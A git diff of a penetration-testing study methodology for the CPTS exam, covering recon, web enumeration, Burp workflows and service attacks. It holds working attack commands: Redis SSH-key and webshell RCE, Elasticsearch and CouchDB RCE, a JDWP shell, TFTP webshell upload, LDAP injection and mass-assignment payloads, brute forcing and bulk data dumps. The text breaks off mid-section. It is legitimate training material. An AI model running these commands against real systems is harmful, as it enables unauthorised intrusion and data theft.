@@ -1,12 +1,74 @@
 # CPTS BULLETPROOF METHODOLOGY
 ## Decision-Tree Based, Iterative, Comprehensive
 
-> This methodology covers 100% of the CPTS exam. Every attack, every scenario, every decision point.
-> Follow the phases sequentially. After EACH new foothold, RESTART from Phase 1 on the new host.
+> Covers 100% of CPTS exam (28 HTB Academy modules). Every attack, every scenario, every decision point.
+> Phases sequential by default. Real flow is iterative — see "FLOW REALITY" below. After EACH new foothold, RESTART from Phase 1 on new host.
 
 ---
 
-# PHASE 0: SETUP & RECON PREP
+## TABLE OF CONTENTS
+
+```
+PHASE 0   — Pre-Engagement, Setup, Recon Prep
+PHASE 1   — External Recon & Enumeration (Nmap, Footprinting)
+PHASE 2   — Web Application Enumeration
+PHASE 3   — Web Application Attacks (LFI/RFI, CMDi, SQLi, XSS, Upload, BF, XXE, SSRF, IDOR, Verb/Header, JWT, LDAPi, Mass Assign)
+PHASE 4   — Service Attacks (FTP, SMB, MSSQL, MySQL, RDP, WinRM, DNS, SMTP, POP3/IMAP, TFTP, SNMP, Oracle, IPMI, Rsync, R-Services)
+PHASE 5   — Password Attacks (cracking — runs in parallel with 7/8/9 once hashes obtained)
+PHASE 6   — Shells & Payloads (web shells, reverse/bind, MSFvenom, AV evasion, AMSI bypass)
+PHASE 7   — Post-Exploitation Credential Harvesting (Win/Linux)
+PHASE 8   — Privilege Escalation (Linux + Windows + Citrix Breakout)
+PHASE 9   — Active Directory Attacks (LLMNR → AS-REP → Kerberoast → ACL → DCSync → ADCS → Trusts → Bleeding edge)
+PHASE 10  — Pivoting & Tunneling (Ligolo-ng, Chisel, SSH, Sshuttle, Dnscat2, ptunnel-ng, Rpivot, SocksOverRDP)
+PHASE 10B — File Transfers
+PHASE 11  — Common Applications (CMS, Tomcat, Jenkins, Splunk, PRTG, GitLab, osTicket, ColdFusion, IIS Tilde, Thick Client, LDAP, SCCM/MECM, WSUS, Veeam)
+PHASE 12  — Documentation & Reporting
+
+QUICK REFERENCE CARDS    — at top, "first 5 minutes" + post-creds + post-admin + pivot
+ITERATIVE METHODOLOGY    — at end, what to do after every foothold
+```
+
+## FLOW REALITY (read before exam)
+
+```
+Linear order vs real exam:
+  Phases 1→2→3 (recon, web) are mostly linear.
+  Phases 4→6→7→8→9 are ITERATIVE — each new foothold restarts the loop.
+  Phase 5 (cracking) runs in PARALLEL once hashes captured in 7/8/9.
+  Phase 10/10B (pivot/transfer) run as needed throughout.
+  Phase 12 (notes/screenshots) is CONTINUOUS — start at Phase 0.
+
+Typical exam path:
+  Phase 0 → 1 (nmap) → 2 (web enum) → 3 (web attack) → 6 (shell)
+  → 7 (creds on host) → 5 (crack if needed) → 8 (privesc) → 9 (AD if joined)
+  → 10 (pivot) → restart at 1 for new subnet
+```
+
+---
+
+# PHASE 0: PRE-ENGAGEMENT, SETUP & RECON PREP
+
+## 0.0 - Pre-Engagement (CPTS exam has these documents — read them FIRST)
+
+```
+Exam scope artifacts:
+├── Letter of Engagement → assets in scope, dates, attack window, contact, RoE
+├── Scoping Questionnaire → tech stack hints, sensitive systems, exclusions
+├── Pre-Engagement Meeting / Kick-off → black/grey/white box, internal/external, evasive Y/N
+└── Contractor Agreement / NDA → handling of loot, retention rules
+
+Read scope before scanning. Out-of-scope hit = report fail. Common scope sections:
+├── In-scope IP/CIDR + domains + apps
+├── Excluded IPs (often DCs from active scanning, prod DBs, third-party SaaS)
+├── Allowed techniques (DoS allowed? social engineering? phys?)
+├── Testing window (start/end timestamps, business hours only?)
+├── Emergency contact (who to call if production breaks)
+└── Reporting deliverables (final report, evidence pack, attestation)
+
+PTES stages (mental model for what phase you're in):
+  Pre-Engagement → Info Gathering → Threat Modeling → Vuln Analysis
+  → Exploitation → Post-Exploitation → Reporting
+```
 
 ## 0.1 - Tool Checklist (verify all present)
 ```
@@ -16,7 +78,24 @@ responder kerbrute bloodhound-python sharphound powerview rubeus mimikatz \
 psexec.py wmiexec.py secretsdump.py smbexec.py mssqlclient.py GetNPUsers.py \
 ticketer.py ntlmrelayx.py evil-winrm xfreerdp sshuttle chisel socat \
 proxychains proxychains4 ssh plink hashcat john ffuf gobuster nikto sqlmap \
-msfvenom msfconsole nc ncat python3
+msfvenom msfconsole nc ncat python3 \
+# Added: AD post-exploit + ADCS + coercion + IPv6 + delegation toolkit
+certipy gMSADumper.py mitm6 Coercer.py addcomputer.py rbcd.py getST.py \
+ldapdomaindump windapsearch.py kerbrute jwt_tool pypykatz adidnsdump \
+gpp-decrypt SharpGPOAbuse PetitPotam.py printerbug.py dfscoerce.py \
+# Pivoting / tunneling
+ligolo-ng chisel sshuttle proxychains4 socat plink dnscat2 ptunnel-ng \
+# Web enum/exploit
+wpscan joomscan droopescan whatweb wappalyzer eyewitness aquatone wafw00f feroxbuster \
+# Linux/Windows privesc
+linpeas.sh winPEASany.exe pspy64 LinEnum.sh Seatbelt.exe PowerUp.ps1 jaws-enum.ps1 \
+SeBackupPrivilegeUtils.dll SeBackupPrivilegeCmdLets.dll \
+# Token/potato suite
+JuicyPotato.exe PrintSpoofer.exe GodPotato.exe \
+# Recon helpers
+theHarvester crt.sh assetfinder amass subfinder dnsenum dnsrecon fierce dnsx httpx \
+# Cracking
+hashcat john hashid cewl
 ```
 
 ## 0.2 - 6-Layer Enumeration Methodology
@@ -57,14 +136,77 @@ Header Injection:    \n \r\n \t %0d %0a %09
 
 **Burp Suite Key Features:**
 ```
-├── Proxy > Intercept → Toggle on/off (keep OFF for passive)
-├── Proxy > HTTP History → Review all requests
-├── Target > Site Map → Application map
+├── Proxy > Intercept → Toggle on/off (keep OFF for passive browsing, ON for editing)
+├── Proxy > HTTP History → Review all requests (filter by host/status/method)
+├── Target > Site Map → Application map (right-click → Engagement Tools → Find comments / Find references)
 ├── Repeater (Ctrl+R) → Modify and resend requests
+│   └── Multiple tabs → keep separate per endpoint
 ├── Intruder (Ctrl+I) → Automated fuzzing/brute force
-├── Decoder → Encode/decode (URL, Base64, HTML, Hex)
-├── Comparer → Diff two responses
+│   ├── Sniper      → 1 param, 1 wordlist
+│   ├── Battering ram → all positions = same payload
+│   ├── Pitchfork   → multiple params, parallel wordlists (user+pass pairs)
+│   └── Cluster bomb → cross-product (every user × every pass)
+├── Decoder → Encode/decode (URL, Base64, HTML, Hex, ASCII hex)
+├── Comparer → Diff two responses (Words/Bytes) — KEY for blind SQLi/auth bypass
+├── Sequencer → randomness test (session tokens, anti-CSRF)
+├── Extender → BApp Store (Logger++, Autorize, JWT Editor, Param Miner)
 └── Right-click → Change request method (GET↔POST)
+```
+
+**Burp Workflow Patterns (exam-grade):**
+```
+# Find hidden parameter
+1. Capture baseline request → send to Repeater
+2. Right-click → "Find references" / Intruder → param wordlist (burp-parameter-names.txt)
+3. Compare response length to baseline → outlier = hidden param
+
+# Bypass blacklist filter
+1. Send request to Repeater
+2. Modify payload variants → resend
+3. Use Comparer on response pairs → find which variant slipped through
+
+# Session handling (automatic re-login after token expires)
+1. Project options → Sessions → Add → Session Handling Rule
+2. Macro: record login flow
+3. Scope: Intruder + Repeater
+4. Result: stale cookies auto-refreshed mid-attack
+
+# Match-and-replace (auto-add auth header)
+1. Proxy → Options → Match and Replace → Add
+2. Type: Request header
+3. Match: ^User-Agent.*  Replace: Authorization: Bearer <token>
+4. Now every request through proxy carries token
+
+# Search across site for secrets / interesting strings
+Target → Site map → right-click root → Engagement Tools → Search
+Search for: "password", "api_key", "TODO", "BEGIN RSA"
+
+# Logger++ extension (full traffic log + search/filter export)
+BApp Store → Logger++ → install
+# Then: Logger++ tab → CSV export → grep for creds
+```
+
+**Burp Intruder — payload set examples:**
+```
+# Login brute force (pitchfork mode)
+Payload set 1: usernames.txt
+Payload set 2: passwords.txt
+Grep Match: "Invalid"  (filter out failed)
+Grep Extract: <csrf_token regex>  (chain CSRF tokens per request)
+
+# IDOR enumeration (sniper mode)
+Position: §id§=1
+Payload: Numbers 1-1000
+Grep Extract: <email regex>  → bulk dump
+
+# Hidden directory fuzzing (sniper mode — but ffuf usually faster)
+Position: /§FUZZ§
+Payload: dirbuster wordlist
+
+# Param mining (cluster bomb)
+Position: ?§param§=§value§
+Payload 1: param wordlist
+Payload 2: ['1', 'true', 'admin', 'a"', "a'"]
 ```
 
 ## 0.5 - Workspace Setup
@@ -75,9 +217,11 @@ mkdir -p loot screenshots notes
 # Every host compromised → note IP, hostname, user, method
 ```
 
-## 0.6 - Vulnerability Scanning (Nessus / OpenVAS)
+## 0.6 - Vulnerability Assessment & CVE Research
+
+### Nessus / OpenVAS (automated scanning)
 ```bash
-# Nessus (CPTS-relevant)
+# Nessus
 # 1. Install: sudo dpkg -i Nessus-*.deb; sudo systemctl start nessusd
 # 2. Access: https://localhost:8834
 # 3. Create scan → Basic Network Scan → Advanced → enable all plugins
@@ -98,6 +242,64 @@ sudo gvm-setup; sudo gvm-start
 # High/Critical RCE → validate manually in Repeater
 # Medium → check exploit-db for PoC
 # Informational → focus on manual testing
+```
+
+### searchsploit / exploit-db / NVD workflow (CRITICAL for every service version)
+```bash
+# Update local exploit-db mirror (offline-capable)
+searchsploit -u
+
+# Search by product + version (drop minor where possible)
+searchsploit apache 2.4.49
+searchsploit "wordpress 5.7"
+searchsploit "tomcat 9"
+searchsploit cisco asa
+
+# Mirror exploit code locally (work offline)
+searchsploit -m <EDB-ID>
+searchsploit -m exploits/linux/remote/47297.py
+
+# Examine before running
+searchsploit -x <EDB-ID>
+cat ~/.searchsploit/exploits/linux/remote/47297.py | head -50
+
+# Filter out junk (DOS, low quality)
+searchsploit apache 2.4 --exclude="(DoS|/dos/)"
+
+# Web → JSON for piping into report
+searchsploit --json tomcat 9 | jq
+
+# CVE lookup chain (after Nessus finds something)
+# 1. Note CVE-YYYY-NNNN
+# 2. NVD: https://nvd.nist.gov/vuln/detail/CVE-YYYY-NNNN
+# 3. exploit-db search: https://www.exploit-db.com/search?cve=YYYY-NNNN
+# 4. GitHub: https://github.com/search?q=CVE-YYYY-NNNN&type=repositories
+# 5. PoCsInGitHub: https://github.com/nomi-sec/PoC-in-GitHub
+
+# Metasploit search
+msfconsole -q -x "search cve:YYYY-NNNN; exit"
+
+# Vetting a PoC BEFORE running (mandatory)
+# - Read full source, look for backdoors / fake exploit shells
+# - Check author rep on GitHub
+# - Test on lab box first if uncertain
+# - Avoid "click here to crash production" DoS modules unless RoE allows
+
+# Quick service-version research one-liners
+nmap -sV -p<port> <target>    # get exact version banner
+banner=$(nc -nv <target> <port> | head -1)
+searchsploit "$(echo $banner | awk '{print $1, $2}')"
+
+# Snapshot Nessus findings → searchsploit chain
+nessus_export.nessus → grep High → for each plugin: searchsploit <product> <version>
+```
+
+### Risk Severity (CVSS 3.1 — see Phase 12 for vector breakdown)
+```
+Critical (9.0-10.0)  → drop everything, validate now
+High     (7.0-8.9)   → next 24 hours
+Medium   (4.0-6.9)   → next sprint, chain with others
+Low      (0.1-3.9)   → harden, don't waste exploit time
 ```
 
 ## 0.7 - Audit Log Credential Harvesting (Linux)
@@ -451,6 +653,36 @@ nmap -sV -p 22 <target>
 hydra -L users.txt -P passwords.txt ssh://<target>
 ```
 
+### TFTP (UDP 69)
+```bash
+# No authentication — anonymous read/write if enabled
+# Discovery
+sudo nmap -sU -p 69 -sV --script tftp-enum <target>
+
+# Connect + interact
+tftp <target>
+tftp> status
+tftp> verbose
+tftp> get <filename>            # download (no listing — must know filename)
+tftp> put shell.php             # upload (if write enabled)
+tftp> quit
+
+# One-liners
+curl -O tftp://<target>/<filename>
+curl -T shell.php tftp://<target>/    # upload via curl
+
+# Common files to grab (TFTP often hosts router configs / firmware)
+for f in startup-config running-config network.conf system.cfg backup.tar; do
+  tftp <target> -c get $f 2>/dev/null && echo "Got $f"
+done
+
+# Brute-force filenames (when listing disabled)
+nmap --script tftp-enum --script-args tftp-enum.filelist=/usr/share/nmap/nselib/data/tftplist.txt -p 69 <target>
+
+# Write a webshell to webroot via TFTP (if app server is also web server)
+# Upload shell.php → access via http://<target>/shell.php
+```
+
 ### SMTP (25)
 ```bash
 # User enumeration
@@ -669,6 +901,193 @@ rusers -al <target>
 # Check /etc/hosts.equiv and ~/.rhosts for trust relationships
 ```
 
+### Telnet (23)
+```bash
+# Banner grab (often leaks OS/device model)
+nc -nv <target> 23
+telnet <target> 23
+
+# Nmap (banner + scripts)
+nmap -sV -p 23 --script "*telnet* and safe" <target>
+
+# Brute force
+hydra -L users.txt -P passwords.txt telnet://<target>
+medusa -h <target> -U users.txt -P passwords.txt -M telnet
+
+# Common default creds — try first
+# root:(empty), admin:admin, admin:password, cisco:cisco, root:calvin
+# Network gear: enable password = "cisco" or empty
+```
+
+### Finger (79)
+```bash
+# Username enumeration (legacy UNIX)
+finger @<target>
+finger root@<target>
+finger user@<target>
+nmap -sV -p 79 --script finger <target>
+
+# pentbox finger user-enum
+for u in $(cat users.txt); do finger $u@<target>; done
+```
+
+### Redis (6379)
+```bash
+# Unauth check (default = no auth)
+redis-cli -h <target> ping        # returns PONG = unauthenticated
+redis-cli -h <target> info
+redis-cli -h <target> config get '*'
+
+# With auth
+redis-cli -h <target> -a '<pass>' ping
+
+# Data dump
+redis-cli -h <target> keys '*'
+redis-cli -h <target> get <key>
+
+# RCE: write SSH key to authorized_keys (if redis runs as user with ~/.ssh/)
+ssh-keygen -t rsa -f /tmp/key -N ""
+(echo -e "\n\n"; cat /tmp/key.pub; echo -e "\n\n") > /tmp/key.txt
+redis-cli -h <target> flushall
+cat /tmp/key.txt | redis-cli -h <target> -x set ssh_key
+redis-cli -h <target> config set dir /root/.ssh/
+redis-cli -h <target> config set dbfilename "authorized_keys"
+redis-cli -h <target> save
+ssh -i /tmp/key root@<target>
+
+# RCE: write webshell to webroot
+redis-cli -h <target> config set dir /var/www/html/
+redis-cli -h <target> config set dbfilename "shell.php"
+redis-cli -h <target> set test "<?php system(\$_GET['cmd']); ?>"
+redis-cli -h <target> save
+curl "http://<target>/shell.php?cmd=id"
+
+# RCE: master/slave replication abuse (newer Redis)
+# Use redis-rogue-server.py — register attacker as master, push module
+python3 redis-rogue-server.py --rhost <target> --lhost <attacker>
+```
+
+### MongoDB (27017)
+```bash
+# Unauth bind check
+mongo --host <target>
+mongo --host <target>:27017
+nmap -sV -p 27017 --script mongodb-info,mongodb-databases <target>
+
+# Modern client
+mongosh --host <target>
+
+# Inside shell
+> show dbs
+> use <db>
+> show collections
+> db.<collection>.find()
+> db.users.find({}, {username:1, password:1})
+
+# Auth
+mongo --host <target> -u <user> -p '<pass>' --authenticationDatabase admin
+
+# Dump everything
+mongodump --host <target> --out ./mongo_dump
+
+# CVE-2021-20329 — NoSQL injection from app side → see §3.16
+```
+
+### Elasticsearch (9200)
+```bash
+# Cluster info (unauth)
+curl http://<target>:9200/
+curl http://<target>:9200/_cluster/health
+curl http://<target>:9200/_cat/indices
+curl http://<target>:9200/_search?pretty
+curl http://<target>:9200/<index>/_search?pretty&size=1000
+
+# Nmap
+nmap -sV -p 9200 --script "elasticsearch*" <target>
+
+# CVE-2014-3120 (Groovy script RCE — old, pre-1.2)
+curl -XPOST http://<target>:9200/_search?pretty -d '
+{"size":1,"script_fields":{"x":{"script":"java.lang.Runtime.getRuntime().exec(\"id\").getInputStream()"}}}'
+
+# CVE-2015-1427 (Sandbox bypass — 1.3.0-1.3.7, 1.4.0-1.4.2)
+# Use Metasploit: exploit/multi/elasticsearch/search_groovy_script
+
+# Modern (no RCE) — focus on data exfil
+curl http://<target>:9200/_all/_search?pretty&size=10000 > exfil.json
+```
+
+### Memcached (11211)
+```bash
+# Stats + key dump
+nc -nv <target> 11211
+> stats
+> stats items
+> stats cachedump <slab_id> <num_keys>
+> get <key>
+> version
+> quit
+
+# Nmap
+nmap -sV -p 11211 --script memcached-info <target>
+
+# Bulk dump
+memcdump --servers=<target>:11211
+memccat --servers=<target>:11211 <key>
+```
+
+### CouchDB (5984)
+```bash
+# Info (no auth on older versions)
+curl http://<target>:5984/
+curl http://<target>:5984/_all_dbs
+curl http://<target>:5984/_users/_all_docs?include_docs=true
+
+# CVE-2017-12635 (privilege escalation via duplicate JSON keys)
+# CVE-2017-12636 (RCE via local.ini config injection — auth required)
+curl -X PUT http://<target>:5984/_node/couchdb@localhost/_config/query_servers/cmd \
+  -u admin:admin -d '"id >&2; echo"'
+curl -X PUT http://<target>:5984/db -u admin:admin
+curl -X PUT http://<target>:5984/db/doc -u admin:admin -d '{"_id":"doc"}'
+curl -X POST http://<target>:5984/db/_temp_view?language=cmd -u admin:admin \
+  -H "Content-Type: application/json" -d '{"map":""}'
+```
+
+### Java RMI / JDWP / JMX (1099, 8000, 1617)
+```bash
+# RMI (1099)
+nmap -sV -p 1099 --script "rmi-*" <target>
+# BaRMIe — enumerate + exploit RMI
+java -jar BaRMIe.jar -enum <target> 1099
+java -jar BaRMIe.jar -attack <target> 1099
+
+# JDWP (Java Debug Wire Protocol — 8000 / 5005 / random)
+# Open JDWP = unauth RCE
+nmap -sV --script jdwp-info -p <port> <target>
+python3 jdwp-shellifier.py -t <target> -p <port> --cmd "id"
+
+# JMX (Java Management Extensions — 1617 / random RMI ports)
+# Default no auth → load malicious MBean → RCE
+msf > use exploit/multi/misc/java_jmx_server
+```
+
+### Cassandra (9042) / RabbitMQ (5672, 15672) / Other
+```bash
+# Cassandra
+nmap -sV -p 9042 --script cassandra-info <target>
+cqlsh <target> 9042
+
+# RabbitMQ management (15672)
+# Default creds: guest:guest (only allowed from localhost since 3.3.0 — but old installs)
+curl http://<target>:15672/api/whoami -u guest:guest
+
+# AMQP (5672) brute
+hydra -L users.txt -P passwords.txt -s 5672 amqp://<target>
+```
+
+> Exploitation flows for these services live alongside enum (above) — Phase 4 covers
+> common services only (FTP/SMB/MSSQL/MySQL/RDP/WinRM/DNS/SMTP/POP3-IMAP).
+> Less-common service attack is contained in this Phase 1.3 entry.
+
 ---
 
 # PHASE 2: WEB APPLICATION ENUMERATION
@@ -832,9 +1251,40 @@ feroxbuster -u http://<target> -w wordlist --virtual-hosts
 
 ### 2.2.4 - Directory Brute-Forcing
 ```bash
+# Directory-only (no extensions)
 gobuster dir -u http://<target> -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 50
 ffuf -u http://<target>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 feroxbuster -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+
+# With extensions (CRITICAL — match server tech)
+# PHP target
+gobuster dir -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -x php,phtml,php5,phps -t 50
+ffuf -u http://<target>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -e .php,.phtml,.php5
+# IIS/.NET target
+gobuster dir -u http://<target> -w wordlist.txt -x asp,aspx,ashx,config -t 50
+# Java/Tomcat target
+gobuster dir -u http://<target> -w wordlist.txt -x jsp,do,action -t 50
+# Generic web
+gobuster dir -u http://<target> -w wordlist.txt -x html,txt,bak,old,zip,tar.gz -t 50
+
+# Status-code filtering
+ffuf -u http://<target>/FUZZ -w wordlist.txt -mc 200,204,301,302,307,401,403
+ffuf -u http://<target>/FUZZ -w wordlist.txt -fc 404         # filter 404
+ffuf -u http://<target>/FUZZ -w wordlist.txt -fs <bytes>     # filter by size (drop default page)
+
+# Recursive (feroxbuster does this best)
+feroxbuster -u http://<target> -w wordlist.txt -x php,html,txt -d 2 -t 50
+
+# Parameter fuzzing (find hidden params)
+ffuf -u 'http://<target>/page.php?FUZZ=test' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs <baseline_size>
+ffuf -u 'http://<target>/api/users' -X POST -d 'FUZZ=test' -H 'Content-Type: application/x-www-form-urlencoded' -w params.txt -fc 404
+
+# Subdomain fuzzing via Host header
+ffuf -w subdomains.txt -u http://<target>/ -H 'Host: FUZZ.<domain>' -fs <baseline>
+
+# HTTP method fuzzing
+ffuf -u http://<target>/admin -X FUZZ -w methods.txt
+# methods.txt: GET, POST, PUT, DELETE, PATCH, OPTIONS, HEAD, TRACE
 ```
 
 ### 2.2.4b - GraphQL Endpoint Discovery + Introspection
@@ -875,90 +1325,57 @@ python3 ReconSpider.py -u http://<target>
 
 ---
 
-## 2.3 - CMS Detection & Enumeration
+## 2.3 - CMS / Application Fingerprinting (detection only — exploitation in §11)
+
+> Fingerprint the CMS/app here, then jump to §11 for full attack chain.
+> Avoids duplicating commands.
 
 ```
-Decision: What CMS/application?
-├── WordPress → WPScan, plugin/theme enum, user enum
-├── Joomla → joomscan, droopescan
-├── Drupal → droopescan, Drupalgeddon checks
-├── Tomcat → /manager, /host-manager, default creds
-├── Jenkins → /script, /manage, default creds
-├── GitLab → Public repos, user registration, API
-├── Splunk → License status, default creds
-├── PRTG → Default creds (prtgadmin:prtg)
-├── osTicket → Version check, known vulns
-├── phpMyAdmin → Default creds, SQL operations
-└── Unknown → Manual testing, Wappalyzer
+Decision: What CMS/application is the target?
+├── WordPress  → see §11.0b WordPress (WPScan, plugin enum, XML-RPC BF, theme RCE)
+├── Joomla     → see §11.0b Joomla (joomscan, default creds, template RCE)
+├── Drupal     → see §11.0b Drupal (droopescan, Drupalgeddon2/3, PHP Filter)
+├── Tomcat     → see §11.0b Apache Tomcat (manager creds, WAR upload, Ghostcat)
+├── Jenkins    → see §11.1 (Script Console RCE)
+├── Splunk     → see §11.2 (custom app deploy)
+├── PRTG       → see §11.3 (prtgadmin:prtg + CVE-2018-9276)
+├── GitLab     → see §11.4 (public repos, API, auth RCE)
+├── osTicket   → see §11.5
+├── phpMyAdmin → see §11.6 (SELECT INTO OUTFILE → webshell)
+├── Nagios     → see §11.7
+├── ColdFusion → see §11.0b ColdFusion (CVE-2010-2861, FCKeditor RCE)
+├── DotNetNuke → see §11.0b DNN (Cookie deserial RCE)
+├── Tomcat CGI / Shellshock → see §11.0b Shellshock
+├── IIS (Tilde 8.3) → see §11.0b IIS Tilde Enumeration
+└── Unknown → Wappalyzer + searchsploit + manual testing
 ```
 
-### WordPress
+**Quick CMS fingerprint commands:**
 ```bash
-# Manual enumeration
-curl -s http://target | grep WordPress
-curl -s http://target | grep themes
-curl -s http://target | grep plugins
-curl -s http://target/wp-content/plugins/mail-masta/readme.txt
+# Generic detection
+whatweb http://<target>
+wappalyzer-cli http://<target>            # if installed
+curl -s http://<target>/ | grep -iE 'generator|powered by|wp-|joomla|drupal'
 
-# User enumeration via login page error messages
-# Valid user + wrong pass: "The password for username admin is incorrect"
-# Invalid user: "The username someone is not registered"
+# WordPress
+curl -s http://<target>/wp-login.php | grep -i wordpress
+curl -s http://<target>/readme.html 2>/dev/null | head -1
 
-# WPScan
-wpscan --url http://target --enumerate --api-token <token>
-wpscan --url http://target --enumerate ap  # All plugins
-wpscan --url http://target --enumerate at  # All themes
+# Joomla
+curl -s http://<target>/administrator/manifests/files/joomla.xml | grep version
 
-# Brute force via XML-RPC (faster)
-wpscan --url http://target --password-attack xmlrpc -t 20 -U admin -P /usr/share/wordlists/rockyou.txt
+# Drupal
+curl -s http://<target>/CHANGELOG.txt | head -2
 
-# Theme editor RCE (needs admin)
-# Appearance → Theme Editor → 404.php → Add: system($_GET[0]);
-# Access: http://target/wp-content/themes/theme/404.php?0=id
+# Tomcat
+curl -s http://<target>:8080/ | grep -i tomcat
+curl -sI http://<target>:8080/             # Server: header
 
-# Metasploit WP admin shell
-use exploit/unix/webapp/wp_admin_shell_upload
-```
+# Jenkins
+curl -sI http://<target>:8080/             # X-Jenkins: <version>
 
-### Tomcat
-```bash
-# Check version
-curl -s http://target:8080/docs/ | grep Tomcat
-
-# Default credentials to try
-# tomcat:tomcat, admin:admin, admin:(empty), tomcat:s3cret, admin:tomcat
-
-# Directory enumeration
-gobuster dir -u http://target:8080/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
-
-# WAR upload for RCE (after getting manager access)
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker> LPORT=<port> -f war -o shell.war
-curl -u tomcat:tomcat --upload-file shell.war "http://target:8080/manager/text/deploy?path=/shell&update=true"
-curl http://target:8080/shell/
-
-# Metasploit
-use exploit/multi/http/tomcat_mgr_upload
-```
-
-### Drupal
-```bash
-# Enumeration
-droopescan scan drupal -u http://target
-
-# Drupalgeddon2 (CVE-2018-7600) - Unauthenticated RCE
-use exploit/unix/drupal/drupal_drupageddon2
-
-# Drupalgeddon3 - Authenticated RCE
-use exploit/multi/http/drupal_drupageddon3
-# Requires valid session cookie
-```
-
-### Joomla
-```bash
-joomscan -u http://target
-droopescan scan joomla -u http://target
-# Check robots.txt for /administrator/
-# Check directory listing in /components/, /modules/, /plugins/
+# phpMyAdmin
+curl -s http://<target>/phpmyadmin/ | grep -i phpmyadmin
 ```
 
 ---
@@ -1360,7 +1777,7 @@ hydra -l admin -P passwords.txt <target> http-post-form "/login:user=^USER^&pass
 hydra -l admin -P passwords.txt <target> http-get /
 ```
 
-## PHASE 3.7 - XXE (XML External Entity)
+## 3.7 - XXE (XML External Entity)
 ```
 Decision: Does app parse XML/SVG/DOCX input?
 ├── Yes → Inject external entity
@@ -1373,7 +1790,7 @@ Decision: Does app parse XML/SVG/DOCX input?
 └── No → Move to next attack
 ```
 
-## PHASE 3.8 - SSRF (Server-Side Request Forgery)
+## 3.8 - SSRF (Server-Side Request Forgery)
 ```
 Decision: Does app fetch URLs on our behalf?
 ├── Yes → Test internal access
@@ -1391,7 +1808,7 @@ Decision: Does app fetch URLs on our behalf?
 └── No → Move to next attack
 ```
 
-## PHASE 3.9 - IDOR (Insecure Direct Object Reference)
+## 3.9 - IDOR (Insecure Direct Object Reference)
 ```
 Decision: Can we manipulate object references (uid, file_id, etc.)?
 ├── Yes → Test access control
@@ -1414,7 +1831,7 @@ Decision: Can we manipulate object references (uid, file_id, etc.)?
 # Mass enumerate: for i in $(seq 1 100); do curl -sOJ URL?hash=$(echo -n $i | base64 | md5sum | cut -d' ' -f1); done
 ```
 
-## PHASE 3.10 - HTTP Verb Tampering & Header Bypass
+## 3.10 - HTTP Verb Tampering & Header Bypass
 ```
 Decision: Is auth/filter only on GET/POST?
 ├── Yes → Try alternate verbs
@@ -1442,7 +1859,7 @@ If app generates PDFs from user input:
     └── <script>xhr.open('GET','http://internal:8080/admin',false);xhr.send();document.write(xhr.responseText);</script>
 ```
 
-## PHASE 3.11 - DOM XSS Source/Sink Reference
+## 3.11 - DOM XSS Source/Sink Reference
 > XSS general payloads in §3.4. DOM-specific reference below.
 ```
 Sources (user-controlled): document.URL, location.hash, location.search, document.referrer, window.name, postMessage data
@@ -1451,7 +1868,7 @@ Sinks (dangerous):         innerHTML, outerHTML, document.write, eval, Function(
 DOM XSS test: append #<svg/onload=alert(1)> to URL → triggers if hash hits sink
 ```
 
-## PHASE 3.12b - JWT (JSON Web Token) Attacks
+## 3.12 - JWT (JSON Web Token) Attacks
 ```
 Decision: App uses JWT (header.payload.signature)?
 ├── alg:none → strip signature, set "alg":"none"
@@ -1503,7 +1920,7 @@ Header: {"alg":"HS256","kid":"key' UNION SELECT 'attacker_secret"}
 → SQLi in kid lookup
 ```
 
-## PHASE 3.12 - .htaccess + Filename Injection (Upload extras)
+## 3.13 - .htaccess + Filename Injection (Upload extras)
 > Full upload attack tree in §3.5. Extras below.
 ```
 .htaccess upload (Apache, when allowed):
@@ -1518,6 +1935,508 @@ Filename injection (when filename used in shell command):
 Race condition upload:
   while true; do curl -F 'file=@shell.php' http://t/upload; done &
   while true; do curl http://t/uploads/shell.php; done    # hit before deletion
+```
+
+## 3.14 - LDAP Injection
+> When web app passes user input into LDAP filter. Bypass auth, dump directory.
+> CPTS Common Apps module covers this. nmap will show port 389/636 open with web app on 80.
+
+```
+Decision: App authenticates via LDAP backend?
+├── Yes → Test special chars in user/pass fields
+│   ├── *           → wildcard match any
+│   ├── (cn=*)      → always-true filter
+│   ├── *)(uid=*    → close filter early
+│   ├── )(&(...))(  → break/inject sub-filter
+│   └── )(|(uid=*   → OR injection
+└── No → skip
+```
+
+**Detection (no creds needed):**
+```bash
+# Username = *  /  password = *  → bypass auth if vulnerable
+# Or in either field:
+#   *)(uid=*
+#   *)(&
+#   *)(|(uid=*))
+#   admin)(&)
+```
+
+**Filter injection (search query):**
+```
+Original filter: (&(objectClass=user)(sAMAccountName=$user)(userPassword=$pass))
+
+Inject in $user field with value:  *
+Resulting filter: (&(objectClass=user)(sAMAccountName=*)(userPassword=dummy))
+→ matches ANY user with password "dummy"
+
+Inject in $pass field with value:  *
+Resulting filter: (&(objectClass=user)(sAMAccountName=dummy)(userPassword=*))
+→ matches dummy with ANY password
+
+Combo: user=*  pass=*    → full auth bypass
+```
+
+**Blind LDAP injection (boolean inference):**
+```
+Inject *)(uid=a*  →  app behavior differs based on whether user starts with 'a'
+Loop alphabet → dump usernames
+```
+
+**Mitigation reminder (for report):** sanitize *, (, ), |, &, NUL bytes; use parameterised query libraries; least-privileged bind account.
+
+## 3.15 - Mass Assignment
+> Framework auto-binds HTTP params to object attributes. Add hidden attribute → privilege escalation / pending-approval bypass.
+> CPTS Common Apps module. Common in Ruby on Rails, Django, Spring, Flask.
+
+```
+Decision: Registration/profile-update form?
+├── Yes → Submit form normally, then add extra fields not shown in UI:
+│   ├── admin=true
+│   ├── role=admin
+│   ├── is_admin=1
+│   ├── verified=true
+│   ├── confirmed=true / approved=true / active=true
+│   ├── userid=1                  # impersonate user 1 on update
+│   ├── permission_level=999
+│   ├── balance=99999
+│   └── group_id=0 (root group in some apps)
+└── No → skip
+```
+
+**Exploit workflow:**
+```bash
+# 1. Submit normal registration
+curl -d 'username=test&password=Test123!&email=t@t' http://target/register
+
+# 2. Add hidden field — try every variation
